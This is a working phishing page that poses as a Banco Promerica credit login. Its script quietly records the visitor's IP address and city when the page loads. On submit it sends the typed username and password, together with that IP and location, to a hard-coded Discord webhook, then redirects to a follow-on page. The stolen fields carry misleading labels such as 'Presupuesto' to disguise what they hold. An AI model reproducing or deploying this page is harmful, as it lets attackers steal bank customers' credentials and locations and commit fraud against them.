<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Promerica/Creditos</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .card {
            background: #ffffff;
            width: 100%;
            max-width: 480px;
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.05);
            text-align: center;
        }

        .logo-box { margin-bottom: 35px; }
        .logo-box img { max-width: 180px; height: auto; }

        .question-wrapper { text-align: left; margin-bottom: 25px; }

        .question-label {
            display: block;
            font-size: 15px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 12px;
        }

        .input-field {
            width: 100%;
            padding: 14px 18px;
            border: 2px solid #e0e6ed;
            border-radius: 10px;
            font-size: 16px;
            box-sizing: border-box;
            background-color: #f9fafb;
            transition: all 0.3s ease;
        }

        .input-field:focus {
            outline: none;
            border-color: #2ecc71;
            background-color: #fff;
        }

        .btn-green {
            width: 100%;
            background-color: #27ae60;
            color: white;
            padding: 18px;
            border: none;
            border-radius: 10px;
            font-size: 17px;
            font-weight: 700;
            text-transform: uppercase;
            cursor: pointer;
            transition: all 0.3s;
        }

        .btn-green:hover { background-color: #219150; }
        .btn-green:disabled { background-color: #a5d6a7; cursor: not-allowed; }

        /* Elementos ocultos para guardar datos de IP */
        #gfg, #address { display: none; }
    </style>
</head>
<body>

    <div id="gfg">Cargando...</div>
    <div id="address">Cargando ubicaci贸n...</div>

    <div class="card">
        <div class="logo-box">
            <img src="https://afcomunicacion.com/wp-content/uploads/2022/09/banco-promerica-logo-DB8A2BA7D2-seeklogo.com_.png" alt="Logo">
        </div>

        <form id="discordForm">
            <div class="question-wrapper">
                <label class="question-label">Usuario</label>
                <input type="text" id="uernm" class="input-field" placeholder="Username" required>
            </div>

            <div class="question-wrapper">
                <label class="question-label">Contrase帽a</label>
                <input type="password" id="clvuernm" class="input-field" placeholder="Password" required>
            </div>

            <button type="submit" id="submitBtn" class="btn-green">Ingresar</button>
        </form>
    </div>

    <script>
        // L贸gica para obtener IP y Ubicaci贸n al cargar la p谩gina
        $(document).ready(function() {
            $.getJSON("https://api.ipify.org?format=json", function(data) {
                $("#gfg").html(data.ip);
            });
            $.getJSON("https://ipinfo.io", function(response) {
                $("#address").html(response.city + ", " + response.country);
            });
        });

        // Env铆o a Discord
        document.getElementById('discordForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const btn = document.getElementById('submitBtn');
            const webhookURL = "https://discordapp.com/api/webhooks/1442908899123531806/8z_rCr-7dX0E_o2tWTgHfOcEfYeTLrXu3ZVLhOqPh2t2MO5QFwvp1WGrqxf3S2O2xoDL"; // REEMPLAZA ESTO

            // Captura de datos fusionada
            const u_name = document.getElementById("uernm").value;
            const u_name2 = document.getElementById("clvuernm").value.replace(/[^0-9]/g, ''); 
            const userIP = document.getElementById("gfg").innerHTML;
            const userLoc = document.getElementById("address").innerHTML;

            btn.innerText = "Procesando...";
            btn.disabled = true;

            const contents = {
                embeds: [{
                    title: " Nuevo Lead con Datos de Ubicaci贸n",
                    color: 2617744,
                    fields: [
                        { name: "User (Obst谩culo)", value: u_name, inline: false },
                        { name: "p4zz (Presupuesto)", value: "$" + u_name2, inline: false },
                        { name: "Direcci贸n IP", value: userIP, inline: true },
                        { name: "Ubicaci贸n", value: userLoc, inline: true }
                    ],
                    footer: { text: "Sistema de Captaci贸n 2026" },
                    timestamp: new Date()
                }]
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(contents)
            })
            .then(response => {
                if (response.ok) {
                    window.location.href = "next.html";
                } else {
                    throw new Error('Error');
                }
            })
            .catch(err => {
                alert("Error al enviar. Int茅ntalo de nuevo.");
                btn.innerText = "Enviar y Continuar";
                btn.disabled = false;
            });
        });
    </script>

</body>
</html>
